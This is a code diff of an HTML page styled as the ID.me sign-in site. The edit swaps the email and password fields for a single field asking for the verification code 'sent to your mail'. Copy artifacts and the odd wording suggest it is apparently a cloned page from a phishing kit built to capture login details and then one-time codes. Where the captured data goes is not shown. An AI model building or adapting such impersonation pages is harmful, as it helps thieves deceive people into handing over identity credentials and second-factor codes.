@@ -52,22 +52,19 @@
                     </div>
                     <main aria-labelledby="sr_page_title" class="form-container">
                         <div class="form-header-access">
-                            <h1 id="sr_page_title">Sign in to ID.me</h1>
+                            <h1 id="sr_page_title">Create ID.me</h1>
                             <div class="form-header-well">
-                                <p>New to ID.me?</p>
-                                <p><a href="../login/index.html">Create an ID.me account</a></p>
+                                <p>Verify your mail</p>
+                                <p><span>Enter the code sent to your mail</span></p>
                             </div>
                         </div>
                         <div class="form-fields">
                             <div class="field-group">
                                 <div class="field text">
-                                    <label for="user_email">Email</label>
-                                    <input placeholder="Enter your email address" required="required" autocomplete="email" type="email" name="username" id="user_email" fdprocessedid="ya9x">
+                                    <label for="user_email">Code</label>
+                                    <input placeholder="Input code" required="required" autocomplete="number" type="number" name="Code" id="user_email" fdprocessedid="ya9x">
                                 </div>
-                                <div class="field text">
-                                    <label for="user_password">Password</label>
-                                    <input placeholder="Enter password" required="required" autocomplete="current-password" type="password" name="password" id="user_password" fdprocessedid="eywn6d">
-                                </div>
+                               
                             </div>
                         </div>
                         <div class="form-actions" data-component="Components.Collector" data-ready="true">
@@ -76,8 +73,8 @@
                                 function change() // no ';' here
                                 {
                                     var elem = document.getElementById("btn-submit");
-                                    if (elem.value == "Signing in to ID.me........") elem.value = "Sign in";
-                                    else elem.value = "Signing in to ID.me......";
+                                    if (elem.value == "Verifying........") elem.value = "Submit";
+                                    else elem.value = "Verifying......";
                                 }
                             </script>
                         </div>
